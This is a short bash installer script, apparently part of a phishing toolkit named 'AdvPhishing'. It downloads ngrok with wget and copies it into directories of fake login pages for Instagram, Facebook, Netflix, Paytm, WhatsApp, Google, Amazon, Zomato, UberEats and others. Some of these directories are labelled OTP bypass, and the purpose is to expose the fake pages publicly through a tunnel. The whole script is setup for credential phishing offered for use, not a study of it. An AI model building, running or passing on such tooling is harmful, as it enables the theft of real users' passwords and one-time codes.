#!/bin/bash
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m >> DOWNLOAD REQUIREMENTS >> \e[0m'

echo ""
echo ""
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
cp -R ngrok github/
cp -R ngrok sites/Hotstar-otp-bypass/
cp -R ngrok sites/instagram/
cp -R ngrok sites/Linkedin/
cp -R ngrok sites/Netflix/
cp -R ngrok sites/Paytm-Phishing/
cp -R ngrok sites/spotify/
cp -R ngrok sites/whatsapp-phishing/
cp -R ngrok sites/facebook/
cp -R ngrok sites/google-otp/
cp -R ngrok sites/instafollow/
cp -R ngrok sites/ipfinder/
cp -R ngrok sites/ola-otpbypass/
cp -R ngrok sites/UberEats-Phishing/
cp -R ngrok sites/Zomato-Phishing/
cp -R ngrok sites/amazonsign/
chmod 7777 AdvPhishing.sh
clear

